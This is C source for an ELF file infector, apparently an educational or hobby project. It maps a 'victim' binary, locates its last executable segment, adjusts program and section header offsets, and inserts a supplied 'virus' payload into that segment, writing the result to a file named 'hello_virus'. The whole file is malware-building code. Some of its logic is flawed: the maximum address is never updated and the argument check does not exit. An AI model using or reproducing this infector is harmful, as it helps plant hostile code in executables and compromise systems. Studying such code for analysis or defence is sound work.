#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

#include "debug.h"

struct file_info
{
	int fd;
	void *handle;
	unsigned size;
};

int get_shdr_table(void *elf_header, Elf64_Shdr **shdr_table)
{
	Elf64_Ehdr *header = (Elf64_Ehdr *)elf_header;
	if (header->e_shnum == 0)
		return 0;

	*shdr_table = (Elf64_Shdr *)((unsigned char *)header
						+ header->e_shoff);
	return header->e_shnum;
}


int get_phdr_table(void *elf_header, Elf64_Phdr **phdr_table)
{
	Elf64_Ehdr *header = (Elf64_Ehdr *)elf_header;
	if (header->e_phnum == 0)
		return 0;

	*phdr_table = (Elf64_Phdr *)((unsigned char *)header
						+ header->e_phoff);
	return header->e_phnum;
}

int get_file_size(const char *file_path)
{
	struct stat st;
	if (stat(file_path, &st) != 0) {
		perror("stat");
		return 0;
	}
	return st.st_size;
}

int get_file_info(const char *path, struct file_info *fi)
{
	int fd;
	unsigned file_size;
	void *handle;

	if (path == NULL || fi == NULL)
		return -1;

	file_size = get_file_size(path);
	if (file_size == 0)
		return -1;
	debug("file %s size is %d\n", path, file_size);
	fd = open(path, O_RDONLY);
	if (fd < 0) {
		perror("open");
		return -1;
	}

	handle = mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (handle == MAP_FAILED) {
		perror("mmap");
		close(fd);
		return -1;
	}

	fi->fd = fd;
	fi->size = file_size;
	fi->handle = handle;
	return 0;
}

void free_file(struct file_info *fi)
{
	if (fi == NULL)
		return;
	if (fi->handle)
		munmap(fi->handle, fi->size);
	close(fi->fd);
	return;
}

Elf64_Phdr *get_last_exec_segment(void *elf)
{
	int i;
	int phdr_size;
	Elf64_Phdr *phdr_table;

	int last_seg_index = -1;
	unsigned long max_vaddr = 0;

	phdr_size = get_phdr_table(elf, &phdr_table);
	if (phdr_size == 0)
		return NULL;

	for ( i = 0; i < phdr_size; i++) {
		Elf64_Phdr tmp = phdr_table[i];
		if (tmp.p_type != PT_LOAD)
			continue;
		if ((tmp.p_flags & PF_X) == 0)
			continue;
		if (tmp.p_vaddr > max_vaddr)
			last_seg_index = i;
		debug("p_vaddr is %lx\n", tmp.p_vaddr);
	}

	if (last_seg_index == -1)
		return NULL;
	return &phdr_table[last_seg_index];
}


unsigned get_align_num(unsigned old_size, unsigned add_size, unsigned align)
{
	unsigned remainder = old_size % align;
	return (remainder + add_size) / align;
}


void adjust_seg_after_target(void *elf, unsigned vaddr_end,
					unsigned mem_offset,
					unsigned phoff_base,
					unsigned file_offset)
{
	int i;
	int phdr_size;
	Elf64_Phdr *phdr_table;

	phdr_size = get_phdr_table(elf, &phdr_table);
	if (phdr_size == 0)
		return;

	for ( i = 0; i < phdr_size; i++) {
		Elf64_Phdr *tmp = &phdr_table[i];
		if (tmp->p_vaddr > vaddr_end)
			tmp->p_vaddr += mem_offset;

		if (tmp->p_offset > phoff_base)
			tmp->p_offset += file_offset;
		debug("p_vaddr is %lx\n", tmp->p_vaddr);
	}
}


void adjust_sec_after_target(void *elf, unsigned phoff_end,
					unsigned file_offset)
{
	int i;
	int shdr_size;
	Elf64_Shdr *shdr_table;

	shdr_size = get_shdr_table(elf, &shdr_table);
	if (shdr_size == 0)
		return;

	for ( i = 0; i < shdr_size; i++) {
		Elf64_Shdr *tmp = &shdr_table[i];
		if (tmp->sh_offset > phoff_end)
			tmp->sh_offset += file_offset;
	}

}

void insert_virus(void *virus_elf, unsigned elf_size,
			void *virus, unsigned virus_size,
			unsigned insert_loc)
{
	memcpy((unsigned char *)virus_elf + insert_loc + virus_size,
			(unsigned char *)virus_elf + insert_loc,
			elf_size - insert_loc);
	memcpy((unsigned char *)virus_elf + insert_loc, virus, virus_size);
}

int write_file(void *handle, unsigned size)
{
	int fd;

	fd = open("hello_virus", O_RDWR | O_CREAT);

	if (fd < 0)
		return -1;

	if (write(fd, handle, size) < size)
		return -1;
	close(fd);
	return 0;
}

int generate_virus_elf(void *victim, int elf_size, void *virus, int virus_size)
{
	unsigned align_num;
	unsigned new_vaddr;
	unsigned insert_loc;
	Elf64_Phdr *target_seg;
	void *virus_elf;

	virus_elf = calloc(1, elf_size + virus_size);
	if (virus_elf == NULL) {
		perror("calloc failed");
		return -1;
	}

	memcpy(virus_elf, victim, elf_size);

	target_seg = get_last_exec_segment(virus_elf);
	if (target_seg == NULL)
		return -1;

	align_num = get_align_num(target_seg->p_memsz,
				virus_size, target_seg->p_align);

	if (align_num > 0) {
		new_vaddr = target_seg->p_vaddr
				+ (align_num + 1) * target_seg->p_align;
		adjust_seg_after_target(virus_elf, new_vaddr,
						target_seg->p_align
						* align_num,
						target_seg->p_offset,
						virus_size);
	}

	insert_loc = target_seg->p_offset + target_seg->p_filesz;
	adjust_sec_after_target(virus_elf, insert_loc, virus_size);

	Elf64_Ehdr *tmp_header = (Elf64_Ehdr *)virus_elf;
	if (target_seg->p_offset < tmp_header->e_phoff)
		tmp_header->e_phoff += virus_size;

	if (target_seg->p_offset < tmp_header->e_shoff)
		tmp_header->e_shoff += virus_size;

	target_seg->p_memsz += virus_size;
	target_seg->p_filesz += virus_size;

	insert_virus(virus_elf, elf_size, virus, virus_size, insert_loc);
	if (write_file(virus_elf, elf_size+virus_size) != 0)
		return -1;
	return 0;
}

int main(int argc, char **argv)
{
	struct file_info victim;
	struct file_info virus;

	if (argc != 3) {
		printf("Please input the elf of victim, and virus code");
	}
	if (get_file_info(argv[1], &victim))
		return -1;
	if (get_file_info(argv[2], &virus))
		return -1;

	generate_virus_elf(victim.handle, victim.size,
					virus.handle, virus.size);

	free_file(&victim);
	free_file(&virus);
	return 0;
}
